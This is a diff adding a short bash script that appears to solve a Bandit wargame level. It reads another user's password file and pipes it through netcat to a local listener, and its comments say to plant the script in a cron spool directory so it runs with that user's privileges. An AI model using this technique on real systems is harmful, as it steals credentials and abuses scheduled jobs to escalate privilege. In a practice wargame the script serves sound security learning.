@@ -1,0 +1,9 @@
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 | nc localhost 60000
+
+
+# Note that you should have a connection listening for incoming messages with the following command:
+# nc -l localhost -p 60000 
+# before the script is run. Also, the script has to be chmoded with 755 permissions and
+# then copied to /var/spool/bandit24
